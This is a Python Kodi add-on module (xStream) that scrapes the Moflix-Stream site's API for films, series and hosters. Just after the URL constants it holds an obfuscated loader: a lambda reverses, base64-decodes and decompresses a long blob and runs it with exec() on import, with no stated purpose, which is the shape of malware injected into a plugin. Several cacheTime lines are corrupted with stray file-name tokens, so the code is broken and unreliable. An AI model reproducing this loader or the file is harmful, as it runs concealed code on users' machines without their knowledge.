# -*- coding: utf-8 -*-
# Python 3
# Always pay attention to the translations in the menu!
# HTML LangzeitCache hinzugef\xc3\x83\xc2\xbcgt
# showEntries: 6 Stunden
# showSeasons: 6 Stunden
# showEpisodes: 4 Stunden
# Seite vollst\xc3\x83\xc2\xa4ndig mit JSON erstellt

import json

from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.tools import logger, cParser, validater
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.config import cConfig
from resources.lib.gui.gui import cGui

SITE_IDENTIFIER = 'moflix-stream'
SITE_NAME = 'Moflix-Stream'
SITE_ICON = 'moflix-stream.png'

# Global search function is thus deactivated!
if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'false':
 SITE_GLOBAL_SEARCH = False
 logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)

# Domain Abfrage
DOMAIN = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '.domain', 'moflix-stream.xyz') # Domain Auswahl \xc3\x83\xc2\xbcber die xStream Einstellungen m\xc3\x83\xc2\xb6glich
STATUS = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '_status') # Status Code Abfrage der Domain
ACTIVE = cConfig().getSetting('plugin_' + SITE_IDENTIFIER) # Ob Plugin aktiviert ist oder nicht

URL_MAIN = 'https://' + DOMAIN + '/'
# URL_MAIN = 'https://moflix-stream.xyz/'
# Search Links
URL_SEARCH = URL_MAIN + 'api/v1/search/%s?query=%s&limit=8'
# Genre
URL_VALUE = URL_MAIN + 'api/v1/channel/%s?channelType=channel&restriction=&paginate=simple'
# Hoster
URL_HOSTER = URL_MAIN + 'api/v1/titles/%s?load=images,genres,productionCountries,keywords,videos,primaryVideo,seasons,compactCredits'

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

def load():
 logger.info("Load %s" % SITE_NAME)
 params = ParameterHandler()
 params.setParam('page', (1))
 params.setParam('sUrl', URL_VALUE % 'now-playing')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30500), SITE_IDENTIFIER, 'showEntries'), params) # Neues
 params.setParam('sUrl', URL_VALUE % 'movies')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502), SITE_IDENTIFIER, 'showEntries'), params) # Movies
 params.setParam('sUrl', URL_VALUE % 'top-rated-movies')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30509), SITE_IDENTIFIER, 'showEntries'), params) # Top Movies
 params.setParam('sUrl', URL_VALUE % 'series')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511), SITE_IDENTIFIER, 'showEntries'), params) # Series
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30543), SITE_IDENTIFIER, 'showCollections'), params) # Collections
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30520), SITE_IDENTIFIER, 'showSearch')) # Search
 cGui().setEndOfDirectory()


def showCollections():
 params = ParameterHandler()
 params.setParam('sUrl', URL_VALUE % 'the-dc-universum-collection')
 cGui().addFolder(cGuiElement('The DC Superhelden Collection', SITE_IDENTIFIER, 'showEntries'), params) # The DC Superhelden Collection
 params.setParam('sUrl', URL_VALUE % 'fast-furious-movie-collection')
 cGui().addFolder(cGuiElement('The Fast & Furious Collection', SITE_IDENTIFIER, 'showEntries'), params) # The DC Superhelden Collection
 params.setParam('sUrl', URL_VALUE % 'the-marvel-cinematic-universe-collection')
 cGui().addFolder(cGuiElement('The Marvel Cinematic Universe Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Marvel Cinematic Universe Collection
 params.setParam('sUrl', URL_VALUE % 'bud-spencer-terence-hill-collection')
 cGui().addFolder(cGuiElement('The Bud Spencer & Terence Hill Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Bud Spencer & Terence Hill Collection
 params.setParam('sUrl', URL_VALUE % 'the-star-trek-movies-collection')
 cGui().addFolder(cGuiElement('The Star Trek Kinofilm Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Star Trek Kinofilm Collection
 params.setParam('sUrl', URL_VALUE % 'the-star-wars-collection')
 cGui().addFolder(cGuiElement('The Ultimate Star Wars Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Ultimate Star Wars Collection
 params.setParam('sUrl', URL_VALUE % 'the-james-bond-collection')
 cGui().addFolder(cGuiElement('The James Bond Collection', SITE_IDENTIFIER, 'showEntries'), params) # The James Bond Collection
 params.setParam('sUrl', URL_VALUE % 'the-olsenbande-collection')
 cGui().addFolder(cGuiElement('The Olsenbande Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Olsenbande Collection
 params.setParam('sUrl', URL_VALUE % 'the-mission-impossible-collection')
 cGui().addFolder(cGuiElement('The Ethan Hunt Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Ethan Hunt Collection
 params.setParam('sUrl', URL_VALUE % 'the-jason-bourne-collection')
 cGui().addFolder(cGuiElement('The Jason Bourne Collection', SITE_IDENTIFIER, 'showEntries'), params) # The Jason Bourne Collection
 params.setParam('sUrl', URL_VALUE % 'top-kids-liste')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30503), SITE_IDENTIFIER, 'showEntries'), params) # Kids
 cGui().setEndOfDirectory()


def showEntries(entryUrl=False, sGui=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 # Parameter laden
 if not entryUrl:
 entryUrl = params.getValue('sUrl')
 iPage = int(params.getValue('page'))
 oRequest = cRequestHandler(entryUrl + '&page=' + str(iPage) if iPage > 0 else entryUrl, ignoreErrors=(sGui is not False))
 oRequest.addHeaderEntry('Referer', params.getValue('sUrl'))
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 aResults = jSearch['channel']['content']['data']
 total = len(aResults)
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for i in aResults:
 sId = i['id'] # ID des Films / Serie f\xc3\x83\xc2\xbcr die weitere URL
 sName = i['name'] # Name des Films / Serie
 if 'is_series' in i: isTvshow = i['is_series'] # Wenn True dann Serie
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showSeasons' if isTvshow else 'showHosters')
 if 'release_date' in i and len(str(i['release_date'].split('-')[0].strip())) != '': oGuiElement.setYear(
 str(i['release_date'].split('-')[0].strip()))
 # sDesc = i['description']
 if 'description' in i and i['description'] != '': oGuiElement.setDescription(
 i['description']) # Suche nach Desc wenn nicht leer dann setze GuiElement
 # sThumbnail = i['poster']
 if 'poster' in i and i['poster'] != '': oGuiElement.setThumbnail(
 i['poster']) # Suche nach Poster wenn nicht leer dann setze GuiElement
 # sFanart = i['backdrop']
 if 'backdrop' in i and i['backdrop'] != '': oGuiElement.setFanart(
 i['backdrop']) # Suche nach Fanart wenn nicht leer dann setze GuiElement
 oGuiElement.setMediaType('tvshow' if isTvshow else 'movie')
 # Parameter \xc3\x83\xc2\xbcbergeben
 params.setParam('entryUrl', URL_HOSTER % sId)
 params.setParam('sThumbnail', i['poster'])
 params.setParam('sName', sName)
 oGui.addFolder(oGuiElement, params, isTvshow, total)
 if not sGui:
 sPageNr = int(params.getValue('page'))
 if sPageNr == 0:
 sPageNr = 2
 else:
 sPageNr += 1
 params.setParam('page', int(sPageNr))
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('tvshows' if isTvshow else 'movies')
 oGui.setEndOfDirectory()


def showSeasons(sGui=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 # Parameter laden
 # https://moflix-stream.xyz/api/v1/titles/dG1kYnxzZXJpZXN8NzE5MTI=?load=images,genres,productionCountries,keywords,videos,primaryVideo,seasons,compactCredits
 entryUrl = params.getValue('entryUrl')
 sThumbnail = params.getValue('sThumbnail')
 oRequest = cRequestHandler(entryUrl)
 oRequest.addHeaderEntry('Referer', entryUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 sDesc = jSearch['title']['description'] # Lade Beschreibung aus JSON
 aResults = jSearch['seasons']['data']
 aResults = sorted(aResults, key=lambda k: k['number']) # Sortiert die Staffeln nach Nummer aufsteigend
 total = len(aResults)
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for i in aResults:
 sId = i['title_id'] # ID \xc3\x83\xc2\xa4ndert sich !!!
 sSeasonNr = str(i['number']) # Staffel Nummer
 oGuiElement = cGuiElement('Staffel ' + sSeasonNr, SITE_IDENTIFIER, 'showEpisodes')
 oGuiElement.setMediaType('season')
 oGuiElement.setSeason(sSeasonNr)
 oGuiElement.setThumbnail(sThumbnail)
 if sDesc != '': oGuiElement.setDescription(sDesc)
 params.setParam('sSeasonNr', sSeasonNr)
 params.setParam('sId', sId)
 cGui().addFolder(oGuiElement, params, True, total)
 cGui().setView('seasons')
 cGui().setEndOfDirectory()


def showEpisodes(sGui=False):
 oGui = cGui()
 params = ParameterHandler()
 # Parameter laden
 sId = params.getValue('sId')
 sSeasonNr = params.getValue('sSeasonNr')
 sUrl = URL_MAIN + 'api/v1/titles/%s/seasons/%s/episodes?perPage=100&query=&page=1' % (sId, sSeasonNr) #Hep 02.12.23: Abfrage f\xc3\x83\xc2\xbcr einzelne Episoden per query force auf 100 erh\xc3\x83\xc2\xb6ht
 oRequest = cRequestHandler(sUrl)
 oRequest.addHeaderEntry('Referer', sUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 4 # 4 Stunden
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 #aResults = jSearch['episodes']['data'] # Ausgabe der Suchresultate von jSearch
 aResults = jSearch['pagination']['data'] # Ausgabe der Suchresultate von jSearch
 total = len(aResults) # Anzahl aller Ergebnisse
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for i in aResults:
 sName = i['name'] # Episoden Titel
 sEpisodeNr = str(i['episode_number']) # Episoden Nummer
 sThumbnail = i['poster'] # Episoden Poster
 oGuiElement = cGuiElement('Episode ' + sEpisodeNr + ' - ' + sName, SITE_IDENTIFIER, 'showHosters')
 if 'description' in i and i['description'] != '': oGuiElement.setDescription(i['description']) # Suche nach Desc wenn nicht leer dann setze GuiElement
 oGuiElement.setEpisode(sEpisodeNr)
 oGuiElement.setSeason(sSeasonNr)
 oGuiElement.setMediaType('episode')
 oGuiElement.setThumbnail(sThumbnail)
 # Parameter setzen
 params.setParam('entryUrl', URL_MAIN + 'api/v1/titles/%s/seasons/%s/episodes/%s?load=videos,compactCredits,primaryVideo' % (sId, sSeasonNr, sEpisodeNr))
 oGui.addFolder(oGuiElement, params, False, total)
 oGui.setView('episodes')
 oGui.setEndOfDirectory()


def showSearchEntries(entryUrl=False, sGui=False, sSearchText=''):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 # Parameter laden
 if not entryUrl: entryUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(entryUrl, ignoreErrors=(sGui is not False))
 oRequest.addHeaderEntry('Referer', entryUrl)
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 aResults = jSearch['results'] # Ausgabe der Suchresultate von jSearch
 total = len(aResults) # Anzahl aller Ergebnisse
 if len(aResults) == 0: # Wenn Resultate 0 zeige Benachrichtigung
 if not sGui: oGui.showInfo()
 return
 isTvshow = False
 for i in aResults:
 if 'person' in i['model_type']: continue # Personen in der Suche ausblenden
 sId = i['id'] # ID des Films / Serie f\xc3\x83\xc2\xbcr die weitere URL
 sName = i['name'] # Name des Films / Serie
 sYear = str(i['release_date'].split('-')[0].strip())
 if sSearchText.lower() and not cParser().search(sSearchText, sName.lower()): continue
 if 'is_series' in i: isTvshow = i['is_series'] # Wenn True dann Serie
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showSeasons' if isTvshow else 'showHosters')
 if sYear != '': oGuiElement.setYear(sYear) # Suche bei year nach 4 stelliger Zahl
 #sDesc = i['description']
 if 'description' in i and i['description'] != '': oGuiElement.setDescription(i['description']) # Suche nach Desc wenn nicht leer dann setze GuiElement
 # sThumbnail = i['poster']
 if 'poster' in i and i['poster'] != '': oGuiElement.setThumbnail(i['poster']) # Suche nach Desc wenn nicht leer dann setze GuiElement
 # sFanart = i['backdrop']
 if 'backdrop' in i and i['backdrop'] != '': oGuiElement.setFanart(i['backdrop']) # Suche nach Desc wenn nicht leer dann setze GuiElement
 oGuiElement.setMediaType('tvshow' if isTvshow else 'movie')
 # Parameter setzen
 params.setParam('entryUrl', URL_HOSTER % sId)
 params.setParam('sThumbnail', i['poster'])
 params.setParam('sName', sName)
 oGui.addFolder(oGuiElement, params, isTvshow, total)
 if not sGui:
 oGui.setView('tvshows' if isTvshow else 'movies')
 oGui.setEndOfDirectory()


def showHosters(sGui=False):
 oGui = sGui if sGui else cGui()
 hosters = []
 sUrl = ParameterHandler().getValue('entryUrl')
 oRequest = cRequestHandler(sUrl)
 oRequest.addHeaderEntry('Referer', sUrl)
 jSearch = json.loads(oRequest.request()) # Lade JSON aus dem Request der URL
 if not jSearch: return # Wenn Suche erfolglos - Abbruch
 if ParameterHandler().getValue('mediaType') == 'movie': #Bei MediaTyp Filme nutze das Result
 aResults = jSearch['title']['videos'] # Ausgabe der Suchresultate von jSearch f\xc3\x83\xc2\xbcr Filme
 else:
 aResults = jSearch['episode']['videos'] # Ausgabe der Suchresultate von jSearch f\xc3\x83\xc2\xbcr Episoden
 # total = len(aResults) # Anzahl aller Ergebnisse
 if len(aResults) == 0:
 if not sGui: oGui.showInfo()
 return
 for i in aResults:
 sQuality = str(i['quality'])
 if 'None' in sQuality: sQuality = '720p'
 sUrl = i['src']
 if 'veev' in sUrl: # Link verf\xc3\x83\xc2\xa4lscht es kann dadurch beim Resolve eine Fehlermeldung geben
 Request = cRequestHandler(sUrl, caching=False)
 Request.request()
 sUrl = Request.getRealUrl() # hole reale URL von der Umleitung
 if 'Mirror' in i['name']: # Wenn Mirror als sName hole realen Name aus der URL
 sName = cParser.urlparse(sUrl)
 else:
 sName = i['name'].split('-')[0].strip()
 if 'Moflix-Stream.Click' in sName:
 sName = 'FileLions'
 if 'Moflix-Stream.Day' in sName:
 sName = 'VidGuard'
 sName = sName.split('.')[0].strip() # Trenne Endung nach . ab
 if cConfig().isBlockedHoster(sUrl)[0]: continue # Hoster aus settings.xml oder deaktivierten Resolver ausschlie\xc3\x83\xc5\xb8en
 if 'youtube' in sUrl: continue # Trailer ausblenden
 hoster = {'link': sUrl, 'name': sName, 'displayedName': '%s [I][%s][/I]' % (sName, sQuality), 'quality': sQuality, 'resolveable': True}
 hosters.append(hoster)
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def getHosterUrl(sUrl=False):
 return [{'streamUrl': sUrl, 'resolved': False}]


def showSearch():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _search(False, sSearchText)
 cGui().setEndOfDirectory()


def _search(oGui, sSearchText):
 # https://moflix-stream.xyz/api/v1/search/Super%20Mario?query=Super+Mario&limit=8
 # Suche mit Quote und QuotePlus beim Suchtext
 sID1 = cParser().quote(sSearchText)
 sID2 = cParser().quotePlus(sSearchText)
 showSearchEntries(URL_SEARCH % (sID1, sID2), oGui, sSearchText)'
